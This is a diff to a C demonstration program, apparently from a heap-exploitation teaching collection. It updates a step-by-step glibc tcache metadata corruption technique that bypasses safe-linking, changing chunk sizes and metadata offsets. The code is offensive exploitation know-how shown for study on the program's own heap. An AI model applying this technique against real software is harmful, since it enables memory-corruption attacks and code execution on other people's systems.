@@ -40,13 +40,16 @@ int main(void) {
 	puts("============================================================");
 	puts("\n");
 
+	// force the allocation of tcache_perthread_struct
+	free(malloc(0x60));
+
 	// Step 1: Allocate
 	puts("Allocate two chunks in two different t-caches:");
 	
-	// Allocate two chunks of size 0x38 for 0x40 t-cache
-	puts("\t- 0x40 chunks:");
-	void *a = malloc(0x38);
-	void *b = malloc(0x38);
+	// Allocate two chunks of size 0x28 for 0x30 t-cache
+	puts("\t- 0x30 chunks:");
+	void *a = malloc(0x28);
+	void *b = malloc(0x28);
 	printf("\t\t* Entry a @ %p\n", a);
 	printf("\t\t* Entry b @ %p\n", b);
 
@@ -70,13 +73,13 @@ int main(void) {
 	puts("");
 
 	// Step 3: Free the two chunks in the two t-caches to make two t-cache entries in two different caches
-	puts("Free the 0x40 and 0x20 chunks to populate the t-caches");
+	puts("Free the 0x30 and 0x20 chunks to populate the t-caches");
 
-	puts("\t- Free 0x40 chunks:");
-	// Free the allocated 0x38 chunks to populate the 0x40 t-cache
+	puts("\t- Free 0x30 chunks:");
+	// Free the allocated 0x28 chunks to populate the 0x30 t-cache
 	free(a);
 	free(b);
-	printf("\t\t> 0x40 t-cache: [%p -> %p]\n", b, a);
+	printf("\t\t> 0x30 t-cache: [%p -> %p]\n", b, a);
 
 	puts("\t- Free the 0x20 chunks");
 	// Free the allocated 0x18 chunks to populate the 0x20 t-cache
@@ -86,27 +89,27 @@ int main(void) {
 	puts("");
 
 	// Step 4: Using our t-cache metadata control primitive, we will now execute the vulnerability
-	puts("Modify the 0x40 t-cache pointer to point to the heap value that holds our arbitrary value, ");
-	puts("by overwriting the LSB of the pointer for 0x40 in the t-cache metadata:");
+	puts("Modify the 0x30 t-cache pointer to point to the heap value that holds our arbitrary value, ");
+	puts("by overwriting the LSB of the pointer for 0x30 in the t-cache metadata:");
 	
 	// Calculate the address of the t-cache metadata
 	void *metadata = (void *)((long)(value) & ~(0xfff));
 
-	// Overwrite the LSB of the 0x40 t-cache chunk to point to the heap chunk containing the arbitrary value
-	*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));
+	// Overwrite the LSB of the 0x30 t-cache chunk to point to the heap chunk containing the arbitrary value
+	*(unsigned int*)(metadata+0xb0) = (long)(metadata)+((long)(value) & (0xfff));
 
 	printf("\t\t> 0x40 t-cache: [%p -> 0x%lx]\n", value, (*(long*)value)^((long)metadata>>12));
 	puts("");
 
 	puts("Allocate once to make the protected pointer the current entry in the 0x40 bin:");
-	void *_ = malloc(0x38);
-	printf("\t\t> 0x40 t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xa0));
+	void *_ = malloc(0x28);
+	printf("\t\t> 0x30 t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xb0));
 	puts("");
 
 	/* VULNERABILITY */	
 	puts("Point the 0x20 bin to the 0x40 bin in the t-cache metadata, containing the newly safe-linked value:");
-	*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;
-	printf("\t\t> 0x20 t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xa0, *(long*)value);
+	*(unsigned int*)(metadata+0xa8) = (long)(metadata)+0xb0;
+	printf("\t\t> 0x20 t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xb0, *(long*)value);
 	puts("");
 	/* VULNERABILITY */	
 
